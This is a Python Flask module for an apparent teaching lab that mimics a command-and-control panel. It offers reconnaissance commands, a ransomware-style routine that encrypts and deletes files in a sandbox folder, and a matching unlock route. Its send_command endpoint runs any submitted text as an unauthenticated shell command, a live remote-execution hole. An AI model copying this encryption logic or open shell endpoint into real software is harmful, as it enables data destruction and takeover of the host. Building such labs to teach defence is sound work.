import base64
import json
import os
import platform
import subprocess
from cryptography.fernet import Fernet
from flask import Blueprint, jsonify, render_template, request

c2_bp = Blueprint("c2_lab", __name__, template_folder="templates")

SANDBOX_DIR = "./sandbox"
KEY_FILE = "secret.key"


def load_or_create_key():
  if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
      return f.read()
  else:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
      f.write(key)
    return key


agent_key = load_or_create_key()
fernet = Fernet(agent_key)


def create_test_file():
  if not os.path.exists(SANDBOX_DIR):
    os.makedirs(SANDBOX_DIR)
  file_path = os.path.join(SANDBOX_DIR, "secret.txt")
  if not os.path.exists(file_path):
    with open(file_path, "w", encoding="utf-8") as f:
      f.write(
          "これは企業の機密データベース、および重要財務ファイルを含む機密データです。"
      )


create_test_file()

ACTIVE_AGENTS = {
    "target_node_web": {"ip": "127.0.0.1 (Local Sandbox)", "status": "Active"}
}
COMMAND_RESULTS = []


@c2_bp.route("/")
def index():
  files = os.listdir(SANDBOX_DIR) if os.path.exists(SANDBOX_DIR) else []
  return render_template("C2.html", files=files, sandbox=SANDBOX_DIR)


@c2_bp.route("/api/agents", methods=["GET"])
def get_agents():
  return jsonify(ACTIVE_AGENTS)


@c2_bp.route("/api/results", methods=["GET"])
def get_results():
  return jsonify(COMMAND_RESULTS)


@c2_bp.route("/api/c2/send_command", methods=["POST"])
def send_command():
  data = request.get_json() or {}
  command = data.get("command", "").strip()

  if not command:
    return jsonify({"error": "コマンドが空です"}), 400

  output = ""
  try:
    if command == "AUDIT_SYS":
      is_root = (os.getuid() == 0) if hasattr(os, "getuid") else False
      info = {
          "system": platform.system(),
          "release": platform.release(),
          "node": platform.node(),
          "current_user": os.getenv("USER")
          or os.getenv("USERNAME")
          or "unknown",
          "is_elevated_root": is_root,
          "working_directory": os.getcwd(),
      }
      output = json.dumps(info, ensure_ascii=False, indent=2)
    elif command in ["procs", "ps aux", "GET_PROCS"]:
      res = subprocess.run(
          ["ps", "aux"], capture_output=True, text=True, timeout=5
      )
      output = res.stdout
    elif command == "AUTO_LOGS":
      # ディスクおよびシステム情報を一括収集する処理
      disk_info = (
          subprocess.check_output(
              "df -h", shell=True, text=True, timeout=5
          )
          if platform.system() != "Windows"
          else "N/A"
      )
      net_info = (
          subprocess.check_output(
              "netstat -an" if platform.system() == "Windows" else "ss -tuln",
              shell=True,
              text=True,
              timeout=5,
          )
          if platform.system() != "Windows"
          else ""
      )
      output = f"=== [DISK INFO] ===\n{disk_info}\n=== [NETWORK INFO] ===\n{net_info}"
    elif command == "lock_files":
      create_test_file()
      count = 0
      for root, dirs, files in os.walk(SANDBOX_DIR):
        for file in files:
          if file.endswith(".locked") or file == KEY_FILE:
            continue
          file_path = os.path.join(root, file)
          with open(file_path, "rb") as f:
            content = f.read()
          encrypted_content = fernet.encrypt(content)
          with open(file_path + ".locked", "wb") as f:
            f.write(encrypted_content)
          os.remove(file_path)
          count += 1
      output = f"[!] 暗号化されました: {count} 個のファイルがロック(.locked)されました。"
    else:
      output = subprocess.check_output(
          command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
      )
  except Exception as e:
    output = f"Execution Failed: {str(e)}"

  result_entry = {
      "agent_id": "target_node_web",
      "command": command,
      "output": output,
  }
  COMMAND_RESULTS.insert(0, result_entry)

  return jsonify({"status": "success", "command": command, "output": output})


@c2_bp.route("/api/lock", methods=["POST"])
def api_lock():
  create_test_file()
  count = 0
  for root, dirs, files in os.walk(SANDBOX_DIR):
    for file in files:
      if file.endswith(".locked") or file == KEY_FILE:
        continue
      file_path = os.path.join(root, file)
      with open(file_path, "rb") as f:
        content = f.read()
      encrypted_content = fernet.encrypt(content)
      with open(file_path + ".locked", "wb") as f:
        f.write(encrypted_content)
      os.remove(file_path)
      count += 1
  return jsonify(
      {
          "status": "success",
          "count": count,
          "message": f"[!] 暗号化されました: {count} 個のファイルがロック(.locked)されました。",
      }
  )


@c2_bp.route("/api/unlock", methods=["POST"])
def api_unlock():
  data = request.get_json() or {}
  key_in = data.get("key", "").strip()

  if not key_in:
    user_key = load_or_create_key()
  else:
    user_key = key_in.encode()

  try:
    user_fernet = Fernet(user_key)
  except Exception:
    return jsonify({"status": "error", "message": "無効な鍵の形式です。"}), 400

  restored = 0
  for root, dirs, files in os.walk(SANDBOX_DIR):
    for file in files:
      if file.endswith(".locked"):
        path = os.path.join(root, file)
        with open(path, "rb") as f:
          decrypted = user_fernet.decrypt(f.read())
        with open(path[:-8], "wb") as f:
          f.write(decrypted)
        os.remove(path)
        restored += 1
  return jsonify(
      {
          "status": "success",
          "restored": restored,
          "message": f"[+] 復元完了！ {restored} 個のファイルが元に戻りました。",
      }
  )